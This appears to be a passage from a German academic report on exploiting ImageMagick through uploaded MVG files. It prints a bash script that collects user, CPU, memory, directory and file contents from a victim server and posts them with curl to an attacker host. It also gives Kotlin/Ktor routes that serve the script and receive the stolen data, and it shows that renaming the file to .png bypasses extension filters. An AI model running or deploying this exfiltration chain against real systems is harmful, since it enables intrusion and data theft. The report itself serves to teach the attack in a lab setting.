\clearpage
\subsubsection{Der Angreifer-Webserver}

\subsubsubsection{Allgemein}

Wir haben uns bei der Implementierung des Angreifer-Webservers für das Framework Ktor~\cite{KtorWebsite} in der Programmiersprache Kotlin~\cite{KotlinProgrammingLanguage} entschieden.

Der Webserver besteht aus folgenden Bestandteilen:
\begin{itemize}
    \item Die attack.sh Script-Datei, welche definiert, welche Aktionen auf dem Opfer-Server ausgeführt werden und die abgefangene Daten zurück an den Angreifer-Server sendet
    \item Einer GET Route /attack, die den Inhalt einer .sh Datei zurückgibt, welcher auf dem Server des Opfers ausgeführt wird
    \item Einer POST Route /report, an die abgefangene Daten gesendet werden können
\end{itemize}

\subsubsubsection{Attack.sh Script}

\begin{lstlisting}[language=Bash, caption=attach.sh Script,label={lst:attacksh}]
#!/bin/bash

REST_URL="http://192.168.16.125:8080"

function report() {
  curl -X POST -F "key=$1" -F "value=$2" -v "$REST_URL/report"
}

report "user" "$(whoami)"
report "ram" "$(free -m)"
report "cpu" "$(lscpu)"
report "ls" "$(ls -la)"
report "test" "$(tail -n 20 test.php)"
\end{lstlisting}
\vspace{5mm}

\begin{itemize}
    \item Es wird eine Adresse/Domain definiert, unter der der Restserver erreichbar ist
    \item Es wird eine report() Funktion definiert, welche per CURL einen POST Request an den /report Endpunkt sendet.
    Der erste Parameter der Funktion ist eine Beschreibung, welche Information abgegriffen wird (Key), der zweite Parameter der Value, also die Daten, die für diesen Key abgegriffen wurden.
    \item Für jede information, die abgegriffen werden soll, wird die report Funktion aufgerufen. Per \$(command) wird die Ausgabe eines Commands zurückgeben und hier als Parameter an die report()-Funktion übergeben
    \item Weitere, auch schreibende oder zerstörende Aktionen, können in der Datei definiert werden
\end{itemize}

\clearpage

\subsubsubsection{GET /attack Route}

\begin{lstlisting}[language=Kotlin, caption=GET /attack Route,label={lst:attackroute}]
get("/attack") {
    var attackSH = getResourceContent("static/attack.sh")
    attackSH = attackSH.replace("\r\n", "\n")
            .replace("\r", "\n")
    call.respondText(attackSH)
}
\end{lstlisting}
\vspace{5mm}

Die GET-Route holt sich den Inhalt der attack.sh Datei und gibt diesen an den Aufrufer als Response zurück.
Wir gehen in unserem Beispiel davon aus, dass das Opfer die Website auf einem Linux Server betreibt.
Linux nutzt das Line-Ending \\n.
Wird der Angreifer-Server auf einem Windows-PC ausgeführt, müssen die Windows-Zeilenumbrüche noch ersetzt werden, damit der Inhalt vom Linux-Server interpretiert werden kann.

\subsubsubsection{POST /report Route}

\begin{lstlisting}[language=Kotlin, caption=POST /report Route,label={lst:portreport}]
post("/report") {
    val parameters = call.receiveParameters()
    println("${parameters["key"]} => ${parameters["value"]}")

    call.respondText("OK")
}
\end{lstlisting}
\vspace{5mm}

In diesem Beispiel, werden die Parameter, also Informationen, die vom attack.sh Script gesammelt und zum Server gesendet werden, auf der Console des Servers ausgegeben.
Weiter könnte man sich ein loggen in einer Datenbank beziehungsweise eine Liveansicht über Websockets vorstellen.

\subsubsection{Umgehen von Uploadbeschränkungen}

Eine erste Idee der Verteidigung wäre, den Upload auf Dateien mit einer gewissen Datei-Endung zu beschränken.
(z.B. Nur PNG-Dateien)
Dieser Fix kann aber einfach umgangen werden, indem man die mvg-Datei zu einer png-Datei umbenennt.
Da ImageMagick den Dateitypen anhand des Inhalts errät, ist es egal, wie die Datei selbst heißt.
Sie Schwachstelle kann somit trotzdem noch ausgenutzt werden.